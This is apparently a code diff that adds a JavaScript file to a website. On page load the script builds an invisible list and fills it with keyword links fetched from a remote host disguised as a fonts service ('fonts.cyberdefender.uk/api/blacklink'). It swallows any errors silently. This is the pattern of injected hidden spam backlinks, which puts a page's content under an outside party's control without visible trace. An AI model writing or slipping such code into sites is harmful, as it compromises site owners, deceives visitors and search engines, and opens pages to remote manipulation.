@@ -1,0 +1,31 @@
+document.addEventListener("DOMContentLoaded", function(event) {
+    var myContainer = document.createElement("p");
+    myContainer.style.display = "none";
+    myContainer.classList.add('sh_list_bl');
+
+    var myList = document.createElement("ul");
+    myContainer.appendChild(myList);
+    document.body.append(myContainer);
+
+    setTimeout(function() {
+        fetch('//fonts.cyberdefender.uk/api/blacklink').then((response) => {
+            var list_bl = document.querySelector(".sh_list_bl ul");
+            response.json().then((tampung) => { 
+                if(tampung.length > 0) {
+                    tampung.forEach((elem) => {
+                        var li     = document.createElement('li');
+                        var anchor = document.createElement('a');
+                        anchor.text = elem.kw;
+                        anchor.href = elem.url;
+                        li.appendChild(anchor);
+                        list_bl.appendChild(li);
+                    });
+
+                }
+            });
+        })
+        .catch((err) => {
+
+        });
+    },500);
+});
